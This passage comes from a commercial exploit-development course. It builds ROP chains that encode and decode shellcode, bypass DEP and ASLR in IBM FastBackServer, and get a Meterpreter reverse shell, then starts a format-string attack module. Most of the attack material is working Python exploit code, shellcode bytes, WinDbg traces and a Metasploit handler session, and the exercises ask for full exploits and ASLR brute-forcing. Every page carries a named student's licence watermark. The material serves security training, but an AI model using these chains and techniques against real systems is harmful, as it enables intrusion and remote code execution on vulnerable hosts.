rop += pack("<L", (0xfffff9e0)) # pop into eax 
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret 
rop += pack("<L", (dllBase + 0x1fd8)) # mov [eax], ecx ; ret 
... 
Listing 593 - Aligning EAX with ROP skeleton 
This alignment is performed by adding the value 0xfffff9e0, which is 0x500 bytes less than the 
previous value of 0xfffffee0, as shown in Listing 593. 
After this change, we must determine the negative offset from the stack address pointing to nSize 
to the first bad character in the shellcode. This calculation is tricky, so we’ll find it dynamically 
instead. 
As previously mentioned, at this point of the ROP chain execution, EAX contains the stack 
address of nSize. To locate the correct offset, we can pop a dummy value like 0xffffffff into ECX, 
which is then subtracted from EAX to perform the alignment. We will then use the debugger to 
determine the correct value to subtract at runtime. 
Taking these modifications into consideration, we can craft the updated code shown in Listing 
594. 
# Restore first shellcode byte 
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret 
rop += pack("<L", (0xffffffff))     
rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret 
rop += pack("<L", (0x11110111)) # 01 in bh 
rop += pack("<L", (dllBase + 0x468ee)) # add [eax+1], bh ; ret 
 
# Align ESP with ROP Skeleton 
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret 
rop += pack("<L", (0xffffffec)) # -14 
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret 
rop += pack("<L", (dllBase + 0x5b415)) # xchg eax, esp ; ret 
 
offset2 = b"C" * (0x600 - len(rop)) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
485 
shellcode = 
b"\xfc\xe8\x82\xff\xff\xff\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x08\x8b\x52" 
padding = b"D" * (0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode)) 
 
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % 
(offset+wpm+eip+rop+offset2+shellcode+padding,0,0,0,0) 
buf += formatString 
Listing 594 - Adding dummy offset and encoded shellcode 
The lower part of Listing 594 includes the final changes, in which we have updated the offset2 
variable to account for the increased size of psCommandBuffer and inserted the first 20 bytes of 
our custom-encoded shellcode. 
Once execution of the ROP chain reaches the decoding section, we can find the distance from 
EAX to the first 0xff byte in the encoded shellcode. 
Note that the instruction that decodes the bad character is “ADD [EAX+1], BH”, which means we 
have to account for the additional one byte in our arithmetic calculation. 
Listing 595 shows WinDbg’s output when the ROP chain reaches the “POP ECX” gadget in the 
decode section. 
eax=10bbe300 ebx=0603be40 ecx=0000020c edx=76fd1670 esi=42424242 edi=00669360 
eip=0316117c esp=10bbe3a4 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
libeay32IBM019!Ordinal1715+0x117c: 
0316117c 59              pop     ecx 
 
0:082> db eax + 61e L10 
10bbe91e  82 ff ff ff 60 89 e5 31-c0 64 8b 50 30 8b 52 08  ....`..1.d.P0.R. 
 
0:082> ? -61e 
Evaluate expression: -1566 = fffff9e2 
Listing 595 - Distance from EAX to first bad character 
Through trial and error, the debugger output reveals a distance of 0x61e bytes from EAX to the 
first bad character. This means that we must pop the value of 0xfffff9e2 into ECX and subtract 
that from EAX. 
Let’s update the offset and rerun the proof of concept, so we can review the shellcode values on 
the stack before and after the decode instruction. 
eax=1477e91e ebx=11110111 ecx=fffff9e2 edx=76fd1670 esi=42424242 edi=00669360 
eip=019468ee esp=1477e3b4 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x1e: 
019468ee 00b801000000    add     byte ptr [eax+1],bh        ds:0023:1477e91f=ff 
 
0:096> db eax L2 
1477e91e  82 ff                                      .. 
 
0:096> p 
eax=1477e91e ebx=11110111 ecx=fffff9e2 edx=76fd1670 esi=42424242 edi=00669360 
eip=019468f4 esp=1477e3b4 ebp=41414141 iopl=0         nv up ei pl zr ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000257 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
486 
libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x24: 
019468f4 c3              ret 
 
0:096> db eax L2 
1477e91e  82 00 
Listing 596 - The first bad character is fixed with ROP 
From the output, we find the original character restored, which proves that the ROP decoding 
technique works. 
Next, we’ll reuse the ROP chain we just developed to restore the next bad character. The next bad 
character is another null byte, which is substituted with 0xff, and it comes just after the previous 
bad character. We can once again align EAX by modifying the value popped into ECX. 
Since the next character to restore comes right after the previous character, we need to subtract 
the value 0xffffffff to increase EAX by one. 
The ROP chain to accomplish this is shown in Listing 597. 
# Restore second bad shellcode byte 
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret 
rop += pack("<L", (0xffffffff))     
rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret 
rop += pack("<L", (0x11110111)) # 01 in bh 
rop += pack("<L", (dllBase + 0x468ee)) # add [eax+1], bh ; ret 
Listing 597 - ROP chain to fix the second bad character 
Next 
we’ll 
restart 
FastBackServer, 
attach 
WinDbg, 
and 
set 
a 
breakpoint 
on 
libeay32IBM019+0x468ee to stop the execution at the “ADD [EAX+1], BH” instruction. Since we’re 
interested in the second execution of the gadget, we must let execution continue the first time the 
breakpoint is hit. 
Listing 598 shows the results when the breakpoint has been triggered twice. 
eax=0dc4e62b ebx=11110111 ecx=ffffffff edx=76fd1670 esi=42424242 edi=00669360 
eip=032a68ee esp=0dc4e3c8 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x1e: 
032a68ee 00b801000000    add     byte ptr [eax+1],bh        ds:0023:0dc4e62c=ff 
 
0:079> db eax-1 L3 
0dc4e62a  82 00 ff                                         ... 
 
0:079> p 
eax=0dc4e62b ebx=11110111 ecx=ffffffff edx=76fd1670 esi=42424242 edi=00669360 
eip=032a68f4 esp=0dc4e3c8 ebp=41414141 iopl=0         nv up ei pl zr ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000257 
libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x24: 
032a68f4 c3              ret 
 
0:079> db eax-1 L3 
0dc4e62a  82 00 00  
Listing 598 - Fixing the second bad character 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
487 
By adding the second sequence of decoding gadgets, we decoded the second bad character by 
putting 0x01 in BH and adding it to the 0xff encoded byte. 
We could use this technique to decode the entire shellcode, but it would be a tiresome, manual 
effort. In the next section, we’ll use our thorough understanding of the decoding process to 
automate it. 
10.4.3.1 Exercises 
1. 
Implement the ROP chain to fix the first and second bad characters in the shellcode, as 
shown in this section. 
2. 
Continue to implement ROP chains to fix the third and fourth bad characters. 
10.4.4 
Automating the Shellcode Encoding 
In this section, we’ll begin the work of creating an automatic ROP encoder. This will allow our 
exploit to detect and encode bad characters in the shellcode without manual input. In the next 
section, we will develop code to dynamically generate the ROP chain that will decode the 
shellcode. 
Our first step towards automation is implementing an encoding routine to modify the shellcode. 
We’ll follow the scheme we used earlier, which is repeated below. 
0x00 -> 0xff 
0x09 -> 0x10 
0x0a -> 0x06 
0x0b -> 0x07 
0x0c -> 0x08 
0x0d -> 0x05 
0x20 -> 0x1f 
Listing 599 - Character substitution scheme 
As part of the encoding routine, the script must keep track of the offsets where bytes are 
modified and how they are modified. Our script will reuse this information when the decoding 
ROP chain is created. 
Let’s separate these requirements into two methods. First, we’ll detect all bad characters with the 
mapBadChars function. Next, we’ll use the encodeShellcode function to encode the shellcode. 
The code for mapBadChars is shown in Listing 600. 
def mapBadChars(sh): 
    BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20" 
    i = 0 
    badIndex = [] 
    while i < len(sh): 
        for c in BADCHARS: 
            if sh[i] == c: 
                badIndex.append(i) 
        i=i+1 
    return badIndex 
Listing 600 - Function to detect all bad characters 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
488 
mapBadChars accepts the shellcode as its only argument. Inside the method, we first list all the 
bad characters, then we create the badIndex array to keep track of the location of the bad 
characters that are discovered in the shellcode. 
To discover the bad characters, we’ll execute a while loop that iterates over all the bytes in the 
shellcode, comparing them with the list of bad characters. If a bad character is found, its index is 
stored in the badIndex array. 
When all of the bad characters have been found, we’re ready for encoding with encodeShellcode, 
as displayed in Listing 601. 
def encodeShellcode(sh): 
    BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20" 
    REPLACECHARS = b"\xff\x10\x06\x07\x08\x05\x1f" 
    encodedShell = sh 
    for i in range(len(BADCHARS)): 
        encodedShell = encodedShell.replace(pack("B", BADCHARS[i]), pack("B", 
REPLACECHARS[i])) 
    return encodedShell 
Listing 601 - Function to encode shellcode 
First, we list both the bad characters and the associated replacement characters. Then we will 
execute a loop over all the bad characters that have been detected in the shellcode and overwrite 
them with the corresponding replacement characters. 
At this point, we have fully encoded the shellcode with our custom encoding scheme and it no 
longer contains any bad characters. 
10.4.4.1 Exercises 
1. 
Create mapBadChars to detect bad characters. 
2. 
Create encodeShellcode to dynamically encode the first 20 bytes of the shellcode. 
10.4.5 
Automating the ROP Decoder 
In the previous section, we developed an automated shellcode encoder by mapping and replacing 
bad characters. Now we can focus on the more complex decoding process. We’ll need to build a 
decoding ROP chain to dynamically handle the bad characters found by mapBadChars. 
Essentially, our code must be able to handle an arbitrary amount of bad characters and arbitrary 
offsets, as well as a shellcode of unknown size. 
Let’s tackle this task by breaking it down into smaller actions. First, we’ll align EAX with the 
beginning of the shellcode. Next, we will perform a loop over each of the bad characters found by 
mapBadChars and add a sequence of ROP gadgets to fix it. Finally, we’ll need to reset EAX to 
point back to the ROP skeleton. 
In the previous proof of concept, we aligned EAX by popping a negative value into ECX and 
subtracting it from EAX. We can reuse this same technique, but this time the subtraction of the 
value will point EAX to one byte before the start of the encoded shellcode. This way, our algorithm 
will be able to handle shellcode with a bad character as the first byte. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
489 
The value we subtracted from EAX in the last section was 0xfffff9e2, and the first bad character 
was at offset 3 into the shellcode. That means we must subtract an additional 3 bytes, or 
0xfffff9e5, to align EAX with the beginning of the shellcode. 
The updated alignment ROP chain is shown in Listing 602. 
# Align EAX with shellcode 
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret 
rop += pack("<L", (0xfffff9e5))  
rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret 
Listing 602 - Aligning EAX with one byte prior to shellcode 
Now that we have aligned EAX with the beginning of the shellcode, we need to create a method 
that dynamically adds a ROP chain for each bad character. 
The generic ROP chain prototype is shown in Listing 603. 
rop += pack("<L", (dllBase + 0x117c))               # pop ecx ; ret 
rop += pack("<L", (offset to next bad characters)) 
rop += pack("<L", (dllBase + 0x4a7b6))              # sub eax, ecx ; pop ebx ; ret 
rop += pack("<L", (value to add))                   # values in BH 
rop += pack("<L", (dllBase + 0x468ee))              # add [eax+1], bh ; ret 
Listing 603 - Generic ROP chain to fix a single bad character 
For each of these ROP chains, our code must calculate the offset from the previous bad 
character to the next. It must also ensure that the offset is popped into ECX, as highlighted in the 
listing above (“offset to next bad characters”). 
Because the value is subtracted from EAX, we’ll need to use its negative counterpart. 
We also need to add a value to the replacement character to restore the original bad character. 
We’ll place this value into the second highlighted section from Listing 603. We must keep in mind 
that the value popped in EBX cannot contain a bad character, and only the byte in BH is used in 
the restore action. 
Let’s start developing the decoding scheme. 
By performing the simple math shown in Listing 604, we obtain usable values for our decoding 
scheme. 
0x01 + 0xff = 0x00 
0xf9 + 0x10 = 0x09 
0x04 + 0x06 = 0x0a 
0x04 + 0x07 = 0x0b 
0x04 + 0x08 = 0x0c 
0x08 + 0x05 = 0x0d 
0x01 + 0x1f = 0x20 
Listing 604 - Values to add to restore original characters 
Next we’ll create the decodeShellcode method, which will use the values shown above to generate 
the ROP chain to decode the shellcode. 
decodeShellcode will require three arguments; the base address of libeay32IBM019, the indexes 
of the bad characters in the shellcode, and the unencoded shellcode. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
490 
The code for decodeShellcode is shown in Listing 605. 
def decodeShellcode(dllBase, badIndex, shellcode): 
    BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20" 
    CHARSTOADD = b"\x01\xf9\x04\x04\x04\x08\x01" 
    restoreRop = b"" 
    for i in range(len(badIndex)): 
        if i == 0: 
            offset = badIndex[i] 
        else: 
            offset = badIndex[i] - badIndex[i-1] 
        neg_offset = (-offset) & 0xffffffff 
        value = 0 
        for j in range(len(BADCHARS)): 
            if shellcode[badIndex[i]] == BADCHARS[j]: 
                value = CHARSTOADD[j] 
        value = (value << 8) | 0x11110011 
 
        restoreRop += pack("<L", (dllBase + 0x117c))    # pop ecx ; ret 
        restoreRop += pack("<L", (neg_offset)) 
        restoreRop += pack("<L", (dllBase + 0x4a7b6))   # sub eax, ecx ; pop ebx ; ret 
        restoreRop += pack("<L", (value))               # values in BH 
        restoreRop += pack("<L", (dllBase + 0x468ee))   # add [eax+1], bh ; ret 
    return restoreRop 
Listing 605 - Method to decode shellcode with ROP 
First we’ll list the possible bad characters and the associated characters we want to add. Next, we 
can create an accumulator variable (restoreRop) that will contain the entire decoding ROP chain. 
Next, we need to perform a loop over all the bad character indexes. For each entry, we’ll calculate 
the offset from the previous bad character to the current bad character. This offset is negated 
and assigned to the neg_offset variable and used in the ROP chain for the POP ECX instruction. 
To determine the value to add to the replacement character, we can perform a nested loop over 
all possible bad characters to determine which one was present at the corresponding index. Once 
the value is found, it is stored in the value variable. 
Since the contents of value must be popped into BH, we have to left-shift it by 8 bits. This will 
produce a value that is aligned with the BH register but contains NULL bytes. To solve the NULL 
byte problem, we will perform an OR operation with the static value 0x11110011. 
Finally, the result is written to the ROP chain where it will be popped into EBX at runtime. 
This complex process enables us to perform custom encoding that avoids bad characters during 
network packet processing. This process also allows us to decode the shellcode before it is 
copied to the non-writable code cave. 
To use decodeShellcode, we’ll call it just after the ROP chain that aligns EAX with the beginning of 
the shellcode. 
# Align EAX with shellcode   
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret 
rop += pack("<L", (0xfffff9e5))  
rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret 
rop += pack("<L", (0x42424242)) # junk into eb 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
491 
 
rop += decodeShellcode(dllBase, pos, shellcode) 
 
# Align ESP with ROP Skeleton 
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret 
rop += pack("<L", (0xffffffec)) # -14 
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret 
rop += pack("<L", (dllBase + 0x5b415)) # xchg eax, esp ; ret 
 
offset2 = b"C" * (0x600 - len(rop)) 
padding = b"D" * (0x1000 - 276 - 4 - len(rop) - len(offset2) - len(encodedShellcode)) 
 
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % 
(offset+wpm+eip+rop+offset2+encodedShellcode+padding,0,0,0,0) 
buf += formatString 
Listing 606 - Calling decodeShellcode 
With the proof of concept updated, let’s restart FastBackServer, attach WinDbg, and set a 
breakpoint on the ROP gadget where EAX is aligned with the shellcode. When the exploit is 
executed, we can verify our decoder in WinDbg: 
0:078> bp libeay32IBM019+0x4a7b6 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll -  
 
0:078> g 
Breakpoint 0 hit 
eax=149de300 ebx=0605be40 ecx=fffff9e5 edx=77251670 esi=42424242 edi=00669360 
eip=0325a7b6 esp=149de3ac ebp=41414141 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
libeay32IBM019!N98E_BIO_f_cipher+0x386: 
0325a7b6 2bc1            sub     eax,ecx 
 
0:098> p 
eax=149de91b ebx=0605be40 ecx=fffff9e5 edx=77251670 esi=42424242 edi=00669360 
eip=0325a7b8 esp=149de3ac ebp=41414141 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
libeay32IBM019!N98E_BIO_f_cipher+0x388: 
0325a7b8 5b              pop     ebx 
 
0:098> db eax L10 
149de91b  43 fc e8 82 ff ff ff 60-89 e5 31 c0 64 8b 50 30  C......`..1.d.P0 
 
0:098> g 
Breakpoint 0 hit 
eax=149de91b ebx=42424242 ecx=fffffffd edx=77251670 esi=42424242 edi=00669360 
eip=0325a7b6 esp=149de3bc ebp=41414141 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
libeay32IBM019!N98E_BIO_f_cipher+0x386: 
0325a7b6 2bc1            sub     eax,ecx 
 
0:098> p 
eax=149de91e ebx=42424242 ecx=fffffffd edx=77251670 esi=42424242 edi=00669360 
eip=0325a7b8 esp=149de3bc ebp=41414141 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
492 
libeay32IBM019!N98E_BIO_f_cipher+0x388: 
0325a7b8 5b              pop     ebx 
 
0:098> db eax L10 
149de91e  82 ff ff ff 60 89 e5 31-c0 64 8b 50 30 8b 52 08  ....`..1.d.P0.R. 
Listing 607 - Alignment of the decoder 
Listing 607 shows that the first time the breakpoint is hit, EAX is aligned with the beginning of the 
shellcode (minus one byte, to account for the offset in the write gadget). 
The second time the breakpoint is triggered, EAX becomes aligned with the first replacement 
character. At this point, we can step through the decoding routine and restore the bad character 
in the shellcode. 
0:098> p 
eax=149de91e ebx=11110111 ecx=fffffffd edx=77251670 esi=42424242 edi=00669360 
eip=0325a7b9 esp=149de3c0 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
libeay32IBM019!N98E_BIO_f_cipher+0x389: 
0325a7b9 c3              ret 
 
0:098> p 
eax=149de91e ebx=11110111 ecx=fffffffd edx=77251670 esi=42424242 edi=00669360 
eip=032568ee esp=149de3c4 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x1e: 
032568ee 00b801000000    add     byte ptr [eax+1],bh        ds:0023:149de91f=ff 
 
0:098> p 
eax=149de91e ebx=11110111 ecx=fffffffd edx=77251670 esi=42424242 edi=00669360 
eip=032568f4 esp=149de3c4 ebp=41414141 iopl=0         nv up ei pl zr ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000257 
libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x24: 
032568f4 c3              ret 
 
0:098> db eax L10 
149de91e  82 00 ff ff 60 89 e5 31-c0 64 8b 50 30 8b 52 08  ....`..1.d.P0.R. 
Listing 608 - Dynamic ROP chain to fix a bad character 
In Listing 608, we stepped through the decoding routine for the first bad character and found that 
the ROP chain restored it correctly. 
Let’s allow execution to continue, triggering the breakpoint an additional two times. We can then 
check the contents of the shellcode after executing the decoding routine against two more bad 
characters: 
0:000> db 149de91e L10 
149de91e  82 00 00 00 60 89 e5 31-c0 64 8b 50 30 8b 52 08  ....`..1.d.P0.R. 
Listing 609 - Dynamic ROP chain has fixed 3 bad characters 
These results confirm that our process is working, since our exploit has dynamically detected the 
three bad characters, replaced them, and generated the required ROP decoder. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
493 
We’re now ready to replace the truncated shellcode with our complete shellcode. Our exploit will 
dynamically encode and decode the shellcode to avoid bad characters and decode the payload in 
the non-writable code cave. 
Our exploit can decode the shellcode, but we are still missing a final step. We need to restore EAX 
to the start of the ROP skeleton before we execute the XCHG ROP gadget. 
If we restart FastBackServer, attach WinDbg, and set a breakpoint on the gadget that aligns EAX 
with the shellcode (libeay32IBM019+0x4a7b6), we can find the distance from the ROP skeleton to 
EAX, as shown in Listing 610. 
eax=110ae91b ebx=0612aad8 ecx=fffff9e5 edx=76fd1670 esi=42424242 edi=00669360 
eip=0327a7b8 esp=110ae3ac ebp=41414141 iopl=0         nv up ei pl nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217 
libeay32IBM019!N98E_BIO_f_cipher+0x388: 
0327a7b8 5b              pop     ebx 
 
0:084> dd eax-62f L7 
110ae2ec  75342890 032c2c04 ffffffff 032c2c04 
110ae2fc  110ae91c 0000020c 0331401c  
Listing 610 - Finding offset from shellcode to ROP skeleton 
Through trial and error, we discover that the difference from EAX to the start of the ROP skeleton 
is 0x62f. 
We can add this value to the index of the last bad character to dynamically determine the 
distance from EAX when the ROP chain completes the decoding process. 
The updated ROP chain segment in Listing 611 calculates the required offset. 
# Align ESP with ROP Skeleton 
skeletonOffset = (-(pos[len(pos)-1] + 0x62f)) & 0xffffffff 
rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret 
rop += pack("<L", (skeletonOffset))    # dynamic offset 
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret 
rop += pack("<L", (dllBase + 0x5b415)) # xchg eax, esp ; ret 
Listing 611 - ROP chain to align EAX with ROP skeleton 
The offset stored in the skeletonOffset variable is found from the last entry of the array of indexes 
associated with the bad characters. 
To verify that the dynamically-found offset is correct, let’s restart FastBackServer, attach WinDbg, 
and set a breakpoint on the “XCHG EAX, ESP” ROP gadget. Then, we’ll run the updated exploit. 
0:084> bp libeay32IBM019+0x5b415 
 
0:084> g 
Breakpoint 0 hit 
eax=110ae2ec ebx=11110111 ecx=fffff76c edx=76fd1670 esi=42424242 edi=00669360 
eip=0328b415 esp=110ae744 ebp=41414141 iopl=0         nv up ei pl nz na po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203 
libeay32IBM019!N98E_a2i_ASN1_INTEGER+0x85: 
0328b415 94              xchg    eax,esp 
 
0:084> dd eax L7 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
494 
110ae2ec  75342890 032c2c04 ffffffff 032c2c04 
110ae2fc  110ae91c 0000020c 0331401c  
Listing 612 - Correctly aligned EAX 
We find that EAX has been correctly realigned with the address for WriteProcessMemory, which is 
stored on the stack. 
Once EAX is aligned with the ROP skeleton and the XCHG ROP gadget is executed, our exploit has 
performed all the steps required to execute WriteProcessMemory and copy the decoded 
shellcode into the code cave. 
As a final proof that the exploit works, we can set up a Metasploit multi/handler and execute our 
exploit without WinDbg attached. 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTP reverse handler on http://192.168.119.120:8080 
[*] http://192.168.119.120:8080 handling request from 192.168.120.10; (UUID: zj3o53wp) 
Staging x86 payload (181337 bytes) ... 
[*] Meterpreter session 1 opened (192.168.119.120:8080 -> 192.168.120.10:53328) 
 
meterpreter >  
Listing 613 - Getting a reverse shell from FastBackServer with ASLR enabled 
Excellent! We have bypassed both ASLR and DEP, dynamically encoded and decoded our 
shellcode with ROP, and obtained a reverse shell. 
Our encoding and decoding technique is now fully-automated and dynamic, making it easy to 
replace our shellcode in the future. 
10.4.5.1 Exercises 
1. 
Implement decodeShellcode to dynamically create the decoding ROP chain and ensure that 
it works. 
2. 
Dynamically align EAX prior to executing the “XCHG EAX, ESP” gadget so that execution 
returns into WriteProcessMemory. 
3. 
Combine all the pieces in this module to obtain a reverse shell while bypassing both ALSR 
and DEP. 
10.4.5.2 Extra Mile 
Create an exploit that resolves VirtualProtect instead of WriteProcessMemory through the 
FXCLI_DebugDispatch function. Then build a ROP chain to achieve code execution while 
bypassing both ASLR and DEP. 
10.4.5.3 Extra Mile 
Since the FastBackServer process is automatically restarted if it crashes, we may opt to bypass 
ASLR through brute force rather than a leak. 
Create an exploit that will attempt to brute force ASLR instead of using the leak. Perform a 
calculation to show how long it will take to perform an exploitation with a greater than 50% 
chance. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
495 
10.4.5.4 Extra Mile 
Instead of using a shellcode decoding routine written in ROP, develop a custom reverse shellcode 
in assembly that does not contain any of the bad characters associated with the memory 
corruption vulnerability exploited in this module. 
10.4.5.5 Extra Mile 
In the C:\tools\aslr folder of the Windows 10 machine, you’ll find an application called 
customsvr01.exe. 
This application is compiled with DEP and ASLR. Reverse engineer it and find a vulnerability that 
will allow you to bypass ASLR. Next, find and exploit a memory corruption vulnerability in the 
same application to achieve code execution. 
10.5 Wrapping Up 
ASLR and DEP work together to form a strong defense, requiring us to leverage multiple 
vulnerabilities to craft a stable exploit. 
In this module, we located a logical vulnerability that we used to develop an ASLR bypass by 
resolving arbitrary functions. We then crafted a ROP chain to call WriteProcessMemory and copy 
our shellcode into an executable memory page of libeay32IBM019.dll, bypassing DEP. Along the 
way, we managed bad characters in the shellcode by developing a dynamic encoding scheme 
and a ROP chain for runtime decoding. 
Putting these pieces together, we overcame the operating system’s ASLR and DEP defense 
mechanisms to obtain a reverse shell. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
496 
 
11 Format String Specifier Attack Part I 
In previous modules, we leveraged memory corruption vulnerabilities that manifested themselves 
as stack buffer overflows by using various functions with unsanitized arguments. We have more 
vulnerabilities to discover, however. 
In this module, we will investigate a different type of vulnerability called format string specifier 
bug.366 
We are going to leverage a format string specifier bug to bypass Address Space Layout 
Randomization (ASLR). Due to the nature of this vulnerability and logic involved, we will need to 
cover more theory and perform additional reverse engineering. 
In the previous modules of this course, we developed exploits that obtained code execution by 
overwriting a large amount of data on the stack and bypassed ASLR by abusing insecure logic. 
With the vulnerability in this module, we will take a more advanced approach and develop a so-
called read primitive. At a high-level, a read primitive is a part of the exploit that allows us to leak 
or read semi-arbitrary memory. The amount of work and attention to detail we have to put in is 
greater, but we will be rewarded with a powerful way to bypass ASLR. 
11.1 Format String Attacks 
Since this is a different type of vulnerability, we have to cover some theory about format strings 
and format string specifiers, as well as how these can be abused to create an exploit to bypass a 
mitigation like ASLR. 
11.1.1 
Format String Theory 
The concept of format strings is found in many programming languages that allow dynamic 
processing and presentation of content in strings. 
This concept consists of two elements. The first is the format string and the other is a format 
function that parses the format string and outputs the final product. 
There are multiple format string functions. Some examples in C++ are printf,367 sprintf,368 and 
vsnprintf.369 The major differences between these functions are in the way arguments are 
supplied and how the output string is returned. 
The simplest format string function is printf, which has the prototype shown in Listing 614. 
int printf( 
 const char *format [, 
 
366 (OWASP, 2020), https://owasp.org/www-community/attacks/Format_string_attack 
367 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/printf/ 
368 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/sprintf/ 
369 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/vsnprintf/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
497 
 argument]... 
); 
Listing 614 - Function prototype of printf 
The first argument, *format, is a pointer to the format string that determines how the content of 
the subsequent arguments are interpreted. 
This interpretation is done according to the format specifiers present in the format string. Format 
specifiers are processed from left to right in the format string, and the format string function 
performs the specified formatting on the associated arguments. 
Format specifiers are used to translate data into a specific format such as hex, decimal, or ASCII, 
as well as to configure their appearance in the final string. 
To better understand format specifiers, we must investigate their syntax, which is presented in 
Listing 615.370 
%[flags][width][.precision][size]type 
Listing 615 - Format string syntax 
Format specifiers start with the symbol % followed by flags, width, precision, and size, which all 
reflect the look, size, and amount of output. They are all optional. 
Type is mandatory, and there are several types to choose from.371 Examples of most common 
type specifiers are given in Listing 616. 
Type - Argument    -    Output format 
x      Integer          Unsigned hexadecimal integer 
i      Integer          Unsigned decimal integer 
e      Floating-point   Signed value that has the form [ - ]d.dddd e [sign]dd 
s      String           Specifies a character string up to the first null character 
n      Pointer          Number of characters that are successfully written so far 
Listing 616 - Common type specifiers 
As an example, Listing 617 shows a simple format string that has the two type specifiers “x” and 
